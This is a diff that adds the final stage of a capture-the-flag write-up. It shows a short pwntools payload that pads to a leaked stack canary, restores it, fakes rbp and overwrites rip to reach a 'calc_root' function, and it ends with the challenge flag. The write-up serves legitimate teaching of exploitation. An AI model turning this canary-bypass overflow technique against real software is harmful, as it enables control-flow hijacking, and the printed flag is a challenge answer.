@@ -180,4 +180,31 @@ And that's correct! We got the stack canary leaked! Let's move on final stage: G
 
 ### Stage 2: Get flag
 
+With canary and **Buffer Overflow**, we now have the control of rip. Let's check where is our input placed in the last option with payload like this:
+
+```
+finish(b'A'*8)
+```
+
+![finish_input_placed.png](images/finish_input_placed.png)
+
+Our new stack canary is `0xa2c6a51796813300` (Cause I re-run it :D). We can see that our input is just near the canary. Remember this order: `canary -> rbp -> rip` so that our final payload will be like this:
+
+```
+payload = b''
+payload += b'A'*0x18                      # Pad to canary
+payload += p64(canary)                    # Canary
+payload += b'B'*0x8                       # Fake rbp
+payload += p64(exe.sym['calc_root'])      # rip
+finish(payload)
+```
+
+Running that script and we get the flag. 
+
+Full code: [solve.py](solve.py)
+
 # 4. Get flag
+
+![get_flag.png](images/get_flag.png)
+
+Flag is `MOCSCTF{3bbbbe8e-18c6-4da3-8bf9-fe38f154426c}`
